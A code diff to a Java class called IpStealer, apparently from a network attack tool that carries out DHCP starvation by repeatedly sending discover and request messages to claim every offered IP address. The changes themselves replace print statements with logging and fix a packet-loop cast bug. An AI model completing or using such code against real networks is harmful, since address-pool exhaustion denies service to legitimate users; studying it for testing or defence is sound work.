@@ -30,19 +30,28 @@ public class IpStealer extends Service {
 
 	@Override
 	public void run() {
-		System.out.println("IpStealer started");
+		this.logger.info("Ip Starvation service is started ...");
 		
 		this.doDiscover();
 		
 		UDPPacket packet = null;
-		while ((packet = (UDPPacket)this.getNextBlockingPacket()) != Packet.EOF) {
+		
+		// If the packet is an EOF we will not be able to cast it to UPDPacket
+		Packet tmpPacket = this.getNextBlockingPacket();
+		
+		while (!tmpPacket.equals(Packet.EOF)) {
+			packet = (UDPPacket)tmpPacket;
+			
 			//System.out.println("Got packet " + packet);
 			if (proceedDHCPOffer(packet)) {
 				// Send another if the packet was a DHCPOffer
 				this.doDiscover();
 			}
+			
+			tmpPacket = this.getNextBlockingPacket();
 		}
-		
+
+		this.logger.info("Ip Starvation service will shutdown NOW ...");
 	}
 	
 	/**
@@ -133,7 +142,7 @@ public class IpStealer extends Service {
 		}
 		
 		
-		System.out.println("Offer " + offer.getYiaddr());
+		this.logger.info("Offer " + offer.getYiaddr());
 		
 		
 		doDHCPRequest(offer);
